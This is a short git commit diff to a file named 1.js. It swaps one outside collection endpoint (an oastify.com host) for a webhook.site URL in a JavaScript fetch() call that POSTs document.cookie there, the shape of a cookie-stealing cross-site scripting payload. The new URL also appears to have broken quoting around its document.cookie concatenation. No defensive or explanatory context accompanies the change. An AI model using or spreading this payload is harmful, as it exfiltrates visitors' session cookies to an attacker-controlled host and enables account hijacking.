2be42b0d3a91d018f8945623f4a9567d9f6e18eb
marcus713605 <marcus.friedrich713@gmail.com>
2025-10-03 10:27:49 -0400

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,4 +1,4 @@
-fetch('https://5gmxqa0p43eq7ulqsywotcet9kfb31rq.oastify.com', {
+fetch("https://webhook.site/91ae6f9a-ba27-4b42-8717-7acc927c74d7/?c='+document.cookie'", {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
